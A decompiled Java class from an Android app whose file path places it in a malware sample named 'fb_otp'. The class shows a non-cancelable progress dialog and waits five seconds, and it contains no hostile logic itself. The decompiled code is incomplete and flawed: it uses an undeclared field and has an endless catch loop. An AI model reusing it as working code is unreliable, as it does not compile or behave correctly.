import android.app.ProgressDialog;
import android.os.AsyncTask;
import com.soft360.iService.MainActivity;
import java.util.concurrent.TimeUnit;

public final class dC
  extends AsyncTask
{
  ProgressDialog jdField_a_of_type_AndroidAppProgressDialog;
  
  private dC(MainActivity paramMainActivity) {}
  
  private static Void a()
  {
    try
    {
      TimeUnit.SECONDS.sleep(5L);
      return null;
    }
    catch (InterruptedException localInterruptedException)
    {
      for (;;)
      {
        localInterruptedException.printStackTrace();
      }
    }
  }
  
  protected final void onPreExecute()
  {
    this.jdField_a_of_type_AndroidAppProgressDialog = new ProgressDialog(this.jdField_a_of_type_ComSoft360IServiceMainActivity);
    this.jdField_a_of_type_AndroidAppProgressDialog.setTitle(this.jdField_a_of_type_ComSoft360IServiceMainActivity.getString(2131165592));
    this.jdField_a_of_type_AndroidAppProgressDialog.setMessage(this.jdField_a_of_type_ComSoft360IServiceMainActivity.getString(2131165593));
    this.jdField_a_of_type_AndroidAppProgressDialog.setCancelable(false);
    this.jdField_a_of_type_AndroidAppProgressDialog.show();
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/dC.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */